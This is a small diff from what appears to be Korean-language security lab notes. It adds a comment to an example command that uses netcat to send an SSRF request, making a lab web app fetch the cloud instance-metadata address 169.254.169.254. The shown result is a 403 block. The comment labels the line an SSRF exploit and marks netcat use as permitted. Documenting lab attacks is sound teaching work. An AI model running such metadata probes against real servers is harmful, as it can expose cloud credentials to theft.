@@ -183,7 +183,7 @@ graph TD
 **실측 예 — el34에서.**
 
 ```bash
-echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'  # nc-ok: SSRF 익스플로잇(?url= 로 앱이 내부 IMDS 접근)
 # → 403
 ```
 
